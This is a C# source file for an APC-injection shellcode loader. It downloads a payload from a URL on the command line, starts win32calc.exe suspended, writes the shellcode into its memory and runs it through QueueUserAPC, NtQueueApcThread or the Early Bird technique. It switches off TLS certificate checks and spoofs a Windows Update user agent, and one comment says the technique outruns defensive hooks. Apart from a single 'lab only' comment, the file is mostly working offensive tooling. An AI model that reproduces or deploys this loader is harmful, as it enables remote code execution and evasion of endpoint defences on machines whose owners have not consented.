using System;
using System.ComponentModel;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace QueueUserAPC
{
    internal class Program
    {
        internal static string ParseUrl(string[] args)
        {
            if (args.Length < 1)
                throw new ArgumentException("Shellcode URL is required.");

            // Skip --nt / --early-bird flags when looking for the URL
            var url = Array.Find(args, a => !a.StartsWith("--"))
                      ?? throw new ArgumentException("Shellcode URL is required.");

            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
                (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
                throw new ArgumentException($"URL must use http or https scheme: {url}");

            return url;
        }

        /// <summary>
        /// Returns true when the <c>--nt</c> flag is present, selecting the
        /// <see cref="Win32.NtQueueApcThread"/> variant over <see cref="Win32.QueueUserAPC"/>.
        /// </summary>
        internal static bool ParseUseNt(string[] args) =>
            Array.Exists(args, a => a.Equals("--nt", StringComparison.OrdinalIgnoreCase));

        /// <summary>
        /// Returns true when the <c>--early-bird</c> flag is present, selecting the
        /// Early Bird APC technique: shellcode is queued via <see cref="Win32.QueueUserAPC"/>
        /// into a process created with <c>CREATE_SUSPENDED</c> before its primary thread has
        /// executed any user-mode code.  Because a newly created suspended thread begins in an
        /// alertable state, the APC fires immediately on <see cref="Win32.ResumeThread"/>,
        /// before the process entry point runs.
        /// </summary>
        internal static bool ParseUseEarlyBird(string[] args) =>
            Array.Exists(args, a => a.Equals("--early-bird", StringComparison.OrdinalIgnoreCase));

        static async Task Main(string[] args)
        {
            string shellcodeUrl;
            bool useNt;
            bool useEarlyBird;
            try
            {
                shellcodeUrl = ParseUrl(args);
                useNt = ParseUseNt(args);
                useEarlyBird = ParseUseEarlyBird(args);
            }
            catch (ArgumentException ex)
            {
                Console.Error.WriteLine($"Error: {ex.Message}");
                Console.Error.WriteLine("Usage: QueuserAPC [--nt | --early-bird] <shellcode-url>");
                Console.Error.WriteLine("  e.g. QueuserAPC https://192.168.1.10/payload.bin");
                Console.Error.WriteLine("       QueuserAPC --nt https://192.168.1.10/payload.bin");
                Console.Error.WriteLine("       QueuserAPC --early-bird https://192.168.1.10/payload.bin");
                Console.Error.WriteLine();
                Console.Error.WriteLine("Flags:");
                Console.Error.WriteLine("  --nt           Use NtQueueApcThread (ntdll) instead of QueueUserAPC (kernel32)");
                Console.Error.WriteLine("  --early-bird   Early Bird APC: queue shellcode into a CREATE_SUSPENDED process");
                Console.Error.WriteLine("                 before its primary thread executes any user-mode code.");
                Console.Error.WriteLine("                 The APC fires on ResumeThread, ahead of the entry point.");
                Environment.Exit(1);
                return;
            }

            var si = new Win32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new Win32.PROCESS_INFORMATION();

            var success = Win32.CreateProcessW(
                "C:\\Windows\\System32\\win32calc.exe",
                null,
                ref ta,
                ref pa,
                false,
                0x00000004, // CREATE_SUSPENDED
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);

            if (!success)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                // SSL validation intentionally disabled — lab/controlled environments only
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40");
                    shellcode = await client.GetByteArrayAsync(shellcodeUrl);
                }
            }

            var baseAddress = Win32.VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            Win32.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Win32.VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            if (useNt)
            {
                // NtQueueApcThread (ntdll) — does not require the target thread to be in an
                // alertable wait state; useful against running threads that may never enter one.
                Win32.NtQueueApcThread(pi.hThread, baseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            else if (useEarlyBird)
            {
                // Early Bird APC — process was created with CREATE_SUSPENDED so the primary
                // thread has not yet executed any user-mode code.  A newly created suspended
                // thread begins in an alertable state, so QueueUserAPC fires immediately when
                // ResumeThread is called, before the process entry point runs.  This gives the
                // shellcode a head start over any in-process defensive hooks loaded via the
                // normal DLL initialisation sequence.
                Win32.QueueUserAPC(baseAddress, pi.hThread, 0);
            }
            else
            {
                // Standard QueueUserAPC (kernel32) — queues an APC to the target thread.
                // Requires the thread to enter an alertable wait (e.g. SleepEx, WaitForSingleObjectEx).
                Win32.QueueUserAPC(baseAddress, pi.hThread, 0);
            }

            Win32.ResumeThread(pi.hThread);
        }
    }
}
